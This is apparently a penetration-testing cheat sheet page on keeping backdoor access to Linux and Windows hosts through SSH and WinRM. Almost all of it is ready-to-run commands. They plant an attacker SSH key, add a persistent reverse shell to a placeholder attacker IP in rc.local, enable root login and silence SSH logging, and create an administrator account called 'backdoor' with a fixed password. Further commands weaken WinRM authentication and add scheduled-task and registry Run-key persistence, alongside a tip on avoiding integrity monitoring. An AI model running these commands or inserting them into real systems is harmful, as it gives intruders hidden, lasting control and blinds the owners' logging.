# Backdoor: SSH & WinRM

!!! tip "Tip"
    For SSH backdoor, add your public key to `~/.ssh/authorized_keys` (or `/root/.ssh/authorized_keys`). No password needed and it survives password changes. For WinRM, enable it with `Enable-PSRemoting -Force` and add your user to the Remote Management Users group.

---

## SSH Backdoor

### Add Attacker SSH Key

```bash
echo "ssh-rsa AAAAB3..." >> ~/.ssh/authorized_keys
```

### Persistent Reverse Shell via rc.local

```bash
echo "nohup bash -i >& /dev/tcp/<attacker-ip>/<port> 0>&1 &" >> /etc/rc.local
```

### Modify SSH Config

!!! warning "Loud"
    Enabling `PermitRootLogin yes` and silencing SSH logs is a highly suspicious change to `/etc/ssh/sshd_config` — any file-integrity monitoring or config-management tool (Puppet, Ansible, Chef) will flag or revert it on its next run. Prefer `authorized_keys` with `from=` restriction where possible.

```bash
sed -i 's/PermitRootLogin no/PermitRootLogin yes/' /etc/ssh/sshd_config
echo "LogLevel QUIET" >> /etc/ssh/sshd_config
systemctl restart ssh
```

---

## WinRM Backdoor

### Enable WinRM

```powershell
winrm quickconfig
winrm set winrm/config/service @{AllowUnencrypted="true"}
winrm set winrm/config/service/auth @{Basic="true"}
```

### Create Backdoor User

```powershell
net user backdoor P@ssw0rd /add
net localgroup Administrators backdoor /add
```

### Connect with Evil-WinRM

```bash
evil-winrm -i 10.10.10.10 -u backdoor -p P@ssw0rd
```

### Scheduled Task Persistence

```powershell
schtasks /create /sc minute /mo 5 /tn "WinRM_Backdoor" /tr "powershell.exe -ExecutionPolicy Bypass -File C:\backdoor.ps1"
```

### Registry-Based Persistence

```powershell
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "WinRM_Backdoor" /t REG_SZ /d "powershell -ExecutionPolicy Bypass -File C:\backdoor.ps1" /f
```
